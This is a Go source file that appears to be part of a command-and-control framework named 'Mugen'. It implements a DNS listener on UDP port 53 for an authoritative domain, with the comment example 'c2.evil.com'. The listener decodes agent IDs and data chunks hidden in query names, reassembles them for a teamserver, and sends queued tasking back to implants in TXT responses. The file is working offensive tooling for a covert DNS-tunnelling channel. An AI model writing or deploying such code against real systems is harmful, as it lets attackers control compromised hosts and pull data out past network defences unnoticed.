package handlers

import (
	"net"
	"strings"

	"Mugen/pkg/agent"
	"Mugen/pkg/colors"
	"Mugen/pkg/logger"
)

type DNSConfig struct {
	Name         string
	BindHost     string
	BindPort     int    // default 53
	Domain       string // authoritative domain, e.g. "c2.evil.com"
	KillDate     int64
	WorkingHours string
}

type DNS struct {
	Config    DNSConfig
	Teamserver agent.TeamServer
	Active    bool
	conn      *net.UDPConn
	state     *dnsState
}

func NewDNS() *DNS {
	return &DNS{state: newDNSState()}
}

func (d *DNS) Start() {
	addr := &net.UDPAddr{
		IP:   net.ParseIP(d.Config.BindHost),
		Port: d.Config.BindPort,
	}
	if addr.IP == nil {
		addr.IP = net.IPv4zero
	}

	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		logger.Error("DNS listener: " + err.Error())
		return
	}
	d.conn = conn
	d.Active = true

	logger.Info("Started \"" + colors.Green(d.Config.Name) + "\" DNS listener on " +
		colors.BlueUnderline("udp://"+addr.String()) + " domain=" + d.Config.Domain)

	pk := d.Teamserver.ListenerAdd("", LISTENER_DNS, d)
	d.Teamserver.EventAppend(pk)
	d.Teamserver.EventBroadcast("", pk)

	go d.serve()
}

func (d *DNS) serve() {
	buf := make([]byte, 4096)
	for d.Active {
		n, raddr, err := d.conn.ReadFromUDP(buf)
		if err != nil {
			if d.Active {
				logger.Debug("DNS read: " + err.Error())
			}
			return
		}
		wire := make([]byte, n)
		copy(wire, buf[:n])
		go d.handleQuery(wire, raddr)
	}
}

func (d *DNS) handleQuery(wire []byte, raddr *net.UDPAddr) {
	qname, txid, ok := dnsParseQueryQname(wire)
	if !ok {
		return
	}

	// Check that the QNAME ends with our domain.
	if !strings.HasSuffix(strings.ToLower(qname), strings.ToLower(d.Config.Domain)) {
		return
	}

	externalIP := raddr.IP.String()

	msgType, agentID, seq, tot, data, err := decodeQname(qname, d.Config.Domain)
	if err != nil {
		logger.Debug("DNS decode: " + err.Error())
		return
	}

	var respPayload []byte

	if msgType == dnsTypePoll {
		respPayload = d.state.dequeueChunk(agentID)
	} else if msgType == dnsTypeData {
		frame := d.state.acceptChunk(agentID, seq, tot, data)
		if frame == nil {
			// Not the last chunk yet - send is_last=1 ACK with no data.
			respPayload = []byte{0x01}
		} else {
			// Full frame assembled - process it.
			resp, success := parseAgentRequest(d.Teamserver, frame, externalIP, d.Config.Name+" [DNS]")
			if success && resp.Len() > 0 {
				d.state.queueResponse(agentID, resp.Bytes())
			}
			respPayload = d.state.dequeueChunk(agentID)
		}
	} else {
		respPayload = []byte{0x01}
	}

	respWire := dnsBuildTXTResponse(txid, qname, respPayload)
	d.conn.WriteToUDP(respWire, raddr)
}

func (d *DNS) Stop() {
	d.Active = false
	if d.conn != nil {
		d.conn.Close()
	}
}
